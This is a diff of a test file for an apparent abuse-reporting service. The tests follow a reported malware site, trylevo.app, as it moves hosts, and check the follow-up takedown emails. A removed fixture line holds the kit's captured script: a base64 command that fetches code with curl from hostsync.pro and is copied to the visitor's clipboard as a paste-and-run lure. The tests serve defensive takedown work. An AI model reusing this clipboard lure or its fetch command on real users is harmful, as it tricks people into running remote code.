@@ -1,114 +1,25 @@
 import { describe, expect, test } from "bun:test";
 import { eq } from "drizzle-orm";
 
-import { SubmissionsEntity } from "@/lib/db/entities/submissions";
 import { getDb } from "@/lib/db";
 import { useTemporaryDatabase } from "@/lib/db/test_helpers";
-import { networkLookup, TRYLEVO_ROUTED_SNAPSHOT } from "@/lib/liveness/host_move.fixtures";
-import type { HostMoveDependencies } from "@/lib/liveness/host_move";
+import { TRYLEVO_ROUTED_SNAPSHOT } from "@/lib/liveness/host_move.fixtures";
 import { HOST_MOVE_ACTION_EVENT, HOST_MOVED_EVENT, hostMovesOf } from "@/lib/liveness/moves";
 import { listSiteChecksForTargets, livenessJobKey, recordSiteCheck } from "@/lib/liveness/repository";
-import { checkSoonAfter, runLivenessCheck, scheduleLivenessChecks } from "@/lib/liveness/schedule";
-import type { SiteCheckDependencies } from "@/lib/liveness/check";
+import { checkSoonAfter, scheduleLivenessChecks } from "@/lib/liveness/schedule";
 import { getReportsForSubmission } from "@/lib/submissions/abuse_details";
 import { nextStep, rankedRoutes, takedownSummary } from "@/lib/submissions/report_view";
-import { seedTrylevoReports, trylevoAt } from "@/lib/submissions/trylevo_reports.fixtures";
+import { trylevoAt } from "@/lib/submissions/trylevo_reports.fixtures";
 import { TRYLEVO_MAIL } from "../mail/trylevo_mail.fixtures";
-import type { sendAbuseEmailRoute } from "../mail/send";
-import { validateAbuseReportRequest } from "../contracts";
 import { AbuseRepository } from "../repository";
-import type { resolveIpTarget } from "../resolver/ip";
-import { contactRoute } from "../resolver/routes";
-import { abuseArtifacts, abuseJobs, abuseMailMessages, abuseProviderRoutes, abuseProviderRuns, abuseReports, type AbuseJob } from "../schema";
+import { abuseArtifacts, abuseJobs, abuseMailMessages, abuseProviderRoutes, abuseProviderRuns, abuseReports } from "../schema";
 import { getProviderSubmissionProvider } from "../providers";
 import { recheckAfterProviderAction } from "../worker/provider_action";
 import { sha256Hex } from "@/lib/util/hash";
 import { reportHostMove } from "./report";
+import { CASE, check, DEMO_JS, events, jobs, LETS_ENCRYPT, nextCheckAt, recordingSend, reportedAt, resolving, routeOf, site, trylevo } from "./report.fixtures";
 
 useTemporaryDatabase();
-
-const CASE = 384401854580134038n;
-/** The kit's own script, as captured when the case was reported. */
-const DEMO_JS = Buffer.from("(()=>{const cmd=atob('Y3VybCAtc2ZMIC0tcmV0cnkgMyAtLXJldHJ5LWFsbC1lcnJvcnMgaHR0cHM6Ly9ob3N0c3luYy5wcm8vaGdwMDNtL0xOY2Y4S3BtNnFXcg==');navigator.clipboard.writeText(cmd)})();");
-const LETS_ENCRYPT = { names: ["trylevo.app"], notBefore: "2026-11-26T19:12:00.000Z", notAfter: "2027-02-24T19:11:59.000Z", issuer: "C=US, O=Let's Encrypt, CN=R13", fingerprint256: "4F:2A:91:0C:7E:55:13:B8:9D:60:AF:21:3C:D4:77:0E:58:9B:C2:16:E3:44:A0:7F:D5:28:61:B9:3E:0A:CC:12" };
-
-/** The site as a check sees it: DNS, no registry hold, the page and the kit's script, at `now`. */
-function site(ips: string[], now: Date, options: { domain?: string; script?: number; server?: string } = {}): SiteCheckDependencies & HostMoveDependencies {
-	const domain = options.domain ?? "trylevo.app";
-	return {
-		dns: { resolve4: async () => ips, resolve6: async () => [], resolveCname: async () => [] },
-		rdap: { rdapLocator: async () => undefined },
-		assertPublicHost: async () => undefined,
-		now: () => now,
-		fetch: async (input) => {
-			const url = input.toString();
-			if (url === `https://${domain}/`) return new Response("<html><title>Levo for Mac</title><script src=\"js/demo.js\"></script></html>", { status: 200, headers: { "content-type": "text/html", server: options.server ?? "nginx/1.30.0" } });
-			if (url === `https://${domain}/js/demo.js`) return (options.script ?? 200) === 200 ? new Response(DEMO_JS, { status: 200, headers: { "content-type": "application/javascript" } }) : new Response("Not Found", { status: options.script! });
-			throw new Error(`Unexpected request to ${url}`);
-		},
-		network: networkLookup(),
-		certificate: async (ip, name) => (ip.startsWith("85.137.52.") && name === domain ? LETS_ENCRYPT : undefined),
-		verificationTargets: async () => [{ path: "/js/demo.js", sha256: sha256Hex(DEMO_JS) }],
-	};
-}
-
-/** The new address's abuse contact as the IP resolver finds it. */
-function resolving(email: string, asn: number) {
-	const asked: string[] = [];
-	const resolveIp = (async (target) => {
-		asked.push(target.normalizedTarget);
-		const snapshot = { target: target.normalizedTarget, bgpOrigin: { asns: [asn] } };
-		return { status: "resolved", resolverSnapshot: snapshot, routes: [contactRoute({ email, providerName: `Abuse contact for ${target.normalizedTarget}`, provenance: { email, source: "ip_rdap" }, snapshot })] };
-	}) as typeof resolveIpTarget;
-	return { asked, resolveIp };
-}
-
-/** A mail relay that records each message as the real one does, so a second send under one key is seen. */
-function recordingSend() {
-	const sent: Array<Parameters<typeof sendAbuseEmailRoute>[0]> = [];
-	const send = (async (params) => {
-		sent.push(params);
-		const rawArtifactId = await AbuseRepository.saveArtifact({ reportId: params.reportId, routeId: params.routeId, runId: params.runId, name: `outbound-${sent.length}.eml`, kind: "outbound_mail_mime", mimeType: "message/rfc822", buffer: Buffer.from(params.body) });
-		const messageId = await AbuseRepository.createOutboundMail({
-			reportId: params.reportId, routeId: params.routeId, runId: params.runId, fromAddress: "support@phishing.support", toAddresses: [params.recipient], subject: params.subject, textBody: params.body,
-			messageId: `<move-${sent.length}@phishing.support>`, replyAddress: `abuse-${sent.length}@reply.phishing.support`, correlationKey: params.correlationKey, rawArtifactId, attachmentArtifactIds: [],
-		});
-		await AbuseRepository.settleOutboundMail({ messageId, status: "sent" });
-		return { messageId, status: "sent", rfcMessageId: `<move-${sent.length}@phishing.support>` };
-	}) as typeof sendAbuseEmailRoute;
-	return { sent, send };
-}
-
-async function jobs(type: AbuseJob["jobType"]): Promise<AbuseJob[]> {
-	return (await getDb()).select().from(abuseJobs).where(eq(abuseJobs.jobType, type)).all().sort((a, b) => a.nextAttemptAt.getTime() - b.nextAttemptAt.getTime());
-}
-
-/** Run the target's pending check as the worker does: the job completes once it queued its successor. */
-async function check(targetId: bigint, dependencies: SiteCheckDependencies & HostMoveDependencies): Promise<void> {
-	const [job] = (await jobs("check_site_liveness")).filter((candidate) => candidate.status === "queued" && candidate.dedupeKey === livenessJobKey(targetId));
-	await runLivenessCheck({ jobId: job!.id, targetId, dependencies });
-	(await getDb()).update(abuseJobs).set({ status: "completed" }).where(eq(abuseJobs.id, job!.id)).run();
-}
-
-/** When the target's next check is due. */
-async function nextCheckAt(targetId: bigint): Promise<Date[]> {
-	return (await jobs("check_site_liveness")).filter((candidate) => candidate.status === "queued" && candidate.dedupeKey === livenessJobKey(targetId)).map((candidate) => candidate.nextAttemptAt);
-}
-
-async function events(reportId: bigint, type: string) {
-	return (await AbuseRepository.listEvents(reportId)).filter((event) => event.eventType === type);
-}
-
-/** Case 384401854580134038 as it stood when trylevo.app left Cloudflare: reported behind Cloudflare, which restricted it and named Sollutium. */
-async function trylevo() {
-	await SubmissionsEntity.create({ id: CASE, kind: "website", data: { kind: "website", website: { url: "https://trylevo.app/" } }, dedupeKey: "website-trylevo.app", status: "reported" });
-	const { site: owner } = await seedTrylevoReports(CASE);
-	await AbuseRepository.setTargetResolution({ targetId: owner.targetId, status: "resolved", resolverSnapshot: TRYLEVO_ROUTED_SNAPSHOT });
-	await scheduleLivenessChecks(owner.targetId);
-	return owner;
-}
-
-const routeOf = async (reportId: bigint, key: string) => (await AbuseRepository.listRoutes(reportId)).find((route) => route.providerRegistryKey === key)!;
 
 describe("trylevo.app leaves Cloudflare after Cloudflare restricted it (case 384401854580134038)", () => {
 	test("the check records the move with its proof, the host gets a follow-up, Cloudflare is told its block was bypassed, and the pages say so", async () => {
@@ -147,10 +58,10 @@ describe("trylevo.app leaves Cloudflare after Cloudflare restricted it (case 384
 		expect(host!.body).toBe([
 			"Hello Sollutium-NL Abuse Team,",
 			"",
-			"Further to our report of the malware distribution site trylevo.app: trylevo.app no longer runs behind Cloudflare's proxy: since 26 Nov 2026 21:30 UTC, it resolves directly to 85.137.52.128, in your network AS43641 (Sollutium-NL SOLLUTIUM EU Sp z.o.o.), and that server serves the reported site itself.",
+			"Further to our report of the malware distribution site trylevo.app: trylevo.app no longer runs behind Cloudflare's proxy: as of 26 Nov 2026 21:30 UTC it resolves directly to 85.137.52.128, in your network AS43641 (Sollutium-NL SOLLUTIUM EU Sp z.o.o.), and that server serves the reported site itself; on 26 Nov 2026 18:50 UTC it still resolved to 188.114.96.2 and 188.114.97.2, in Cloudflare (AS13335).",
 			"",
 			"What we found:",
-			"- DNS: trylevo.app resolves to 85.137.52.128 (checked 26 Nov 2026 21:30 UTC; before: 188.114.96.2 and 188.114.97.2, Cloudflare (AS13335)).",
+			"- DNS: trylevo.app resolves to 85.137.52.128 (checked 26 Nov 2026 21:30 UTC; on 26 Nov 2026 18:50 UTC: 188.114.96.2 and 188.114.97.2, Cloudflare (AS13335)).",
 			`- TLS: 85.137.52.128:443 presents a certificate for trylevo.app issued by C=US, O=Let's Encrypt, CN=R13, valid 2026-11-26 to 2027-02-24, SHA-256 fingerprint ${LETS_ENCRYPT.fingerprint256}.`,
 			"- HTTP: the server answers as \"nginx/1.30.0\".",
 			"- Content: this file is byte-identical to what we captured when we reported the site:",
@@ -158,7 +69,7 @@ describe("trylevo.app leaves Cloudflare after Cloudflare restricted it (case 384
 			"",
 			"To check it yourself:",
 			"  openssl s_client -connect 85.137.52.128:443 -servername trylevo.app",
-			"  curl -s --resolve trylevo.app:443:85.137.52.128 https://trylevo.app/js/demo.js | sha256sum",
+			"  curl -s --resolve 'trylevo.app:443:85.137.52.128' 'https://trylevo.app/js/demo.js' | sha256sum",
 			"",
 			"Please suspend the service at 85.137.52.128 and preserve its data for law enforcement.",
 			"",
@@ -169,7 +80,7 @@ describe("trylevo.app leaves Cloudflare after Cloudflare restricted it (case 384
 			"support@phishing.support",
 			"https://phishing.support",
 		].join("\n"));
-		expect(cloudflare!.body).toStartWith("Hello Cloudflare Trust & Safety,\n\nRegarding report 983629f3ca31bae5 (trylevo.app): you acted on the reported malware distribution site, and its operator has since bypassed that by taking the site off your network. trylevo.app no longer runs behind Cloudflare's proxy: since 26 Nov 2026 21:30 UTC, it resolves directly to 85.137.52.128, in AS43641 (Sollutium-NL SOLLUTIUM EU Sp z.o.o.), and that server serves the reported site itself. Visitors reach it without your interstitial.");
+		expect(cloudflare!.body).toStartWith("Hello Cloudflare Trust & Safety,\n\nRegarding report 983629f3ca31bae5 (trylevo.app): you acted on the reported malware distribution site, and the site has since been taken off your network. trylevo.app no longer runs behind Cloudflare's proxy: as of 26 Nov 2026 21:30 UTC it resolves directly to 85.137.52.128, in AS43641 (Sollutium-NL SOLLUTIUM EU Sp z.o.o.), and that server serves the reported site itself; on 26 Nov 2026 18:50 UTC it still resolved to 188.114.96.2 and 188.114.97.2, in Cloudflare (AS13335). Whatever you applied to it no longer stands between the site and its visitors.");
 		expect(cloudflare!.body).toContain("We have told the new host (abuse-ams@v-sys.org).");
 		expect(cloudflare!.routeId).toBe((await routeOf(reportId, "cloudflare")).id);
 
@@ -265,18 +176,6 @@ describe("trylevo.app leaves Cloudflare after Cloudflare restricted it (case 384
 	});
 });
 
-/** A site reported on a host of its own (not behind a CDN), in production's resolver snapshot shape. */
-async function reportedAt(ip: string, asn: number, holder: string) {
-	const domain = "levo-mac.com";
-	const request = await validateAbuseReportRequest({ targets: [domain], observedUrls: [{ target: domain, urls: [`https://${domain}/`] }], allegationCategory: "malware", description: `Malware distribution at https://${domain}/.` });
-	const { reportId } = await AbuseRepository.createReport({ request, reporter: {} });
-	const [target] = await AbuseRepository.listTargets(reportId);
-	(await getDb()).delete(abuseJobs).where(eq(abuseJobs.reportId, reportId)).run();
-	await AbuseRepository.setTargetResolution({ targetId: target!.id, status: "resolved", resolverSnapshot: { target: domain, infrastructure: { ipResolutions: [{ ip, status: "resolved", resolverSnapshot: { bgpOrigin: { asns: [asn] }, asnRdap: [{ asn, organization: { organization: holder } }] } }] } } });
-	await scheduleLivenessChecks(target!.id);
-	return { reportId, targetId: target!.id, domain };
-}
-
 describe("other moves", () => {
 	test("host A to host B: the new host's abuse contact becomes a new route of the same report, with the move as evidence", async () => {
 		const { reportId, targetId, domain } = await reportedAt("5.161.1.1", 213230, "Hetzner Online GmbH");
@@ -329,7 +228,8 @@ describe("other moves", () => {
 		expect(filed).toHaveLength(1);
 		expect(filed[0]!.confirmationId).toBe("e8a998e9-ed1c-449c-a426-de1c6c183154");
 		expect(filed[0]!.attachments).toEqual(["website.png"]);
-		expect(filed[0]!.body).toStartWith(`Hello Eranet Trust & Safety,\n\nFurther to our report of the malware distribution site ${domain}: the domain is still in use. ${domain} has moved from 5.161.1.1, in AS213230 (Hetzner Online GmbH), to 85.137.52.128, in AS43641 (Sollutium-NL SOLLUTIUM EU Sp z.o.o.), since 27 Nov 2026 08:00 UTC, and the new server serves the reported site.`);
+		expect(filed[0]!.body).toStartWith(`Hello Eranet Trust & Safety,\n\nFurther to our report of the malware distribution site ${domain}: the domain is still in use. ${domain} has moved: as of 27 Nov 2026 08:00 UTC it resolves to 85.137.52.128, in AS43641 (Sollutium-NL SOLLUTIUM EU Sp z.o.o.), and that server serves the reported site; on `);
+		expect(filed[0]!.body).toContain("it still resolved to 5.161.1.1, in AS213230 (Hetzner Online GmbH).");
 		expect(filed[0]!.body).toContain(`Please suspend the domain ${domain}.`);
 		expect((await jobs("poll_provider_correspondence")).map((job) => job.routeId)).toEqual([routeId]);
 		expect((await events(reportId, HOST_MOVE_ACTION_EVENT)).filter((event) => event.routeId === routeId).map((event) => (event.data as { action: string }).action)).toEqual(["rechecked", "followed_up"]);
